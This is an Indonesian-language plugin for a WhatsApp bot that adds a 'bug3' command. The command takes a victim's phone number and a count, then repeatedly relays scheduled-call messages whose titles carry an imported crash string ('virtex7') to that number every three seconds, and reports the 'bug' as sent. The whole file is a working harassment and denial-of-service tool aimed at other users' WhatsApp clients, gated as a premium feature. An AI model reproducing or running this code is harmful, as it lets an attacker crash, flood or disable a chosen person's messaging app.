let moment = require('moment-timezone')
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { kemiibug } = require('../lib/kemiibug.js')
const { weg } = require('../lib/weg.js')
const { virtex7 } = require('../lib/virtex7.js')

let handler = async (m, { conn, text, command, usedPrefix }) => {
let [number, jumlah] = text.split `|`
if (!number) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067|20`, m)
if (!jumlah) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067|20`, m)
if (number == nomorown) return conn.reply(m.chat, 'Tidak bisa spam ke nomor ini!', m)
jumlah = `${jumlah}`
for (let i = 0; i < jumlah; i++) {
const cap = `${virtex7}`
let call = {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${cap}`
}}
conn.relayMessage(`${number}@s.whatsapp.net`, call, {})
await sleep(3000)
}
conn.reply(m.chat, `*Sukses mengirim Bug Ke ${number} Tolong Jeda 3 Menit Yah*`, m)
}
handler.help = ['bug3 *<number|amount>*']
handler.tags = ['bug']
handler.premium = true
handler.command = /^(bug3)$/i
handler.register = true
handler.limit = true

module.exports = handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}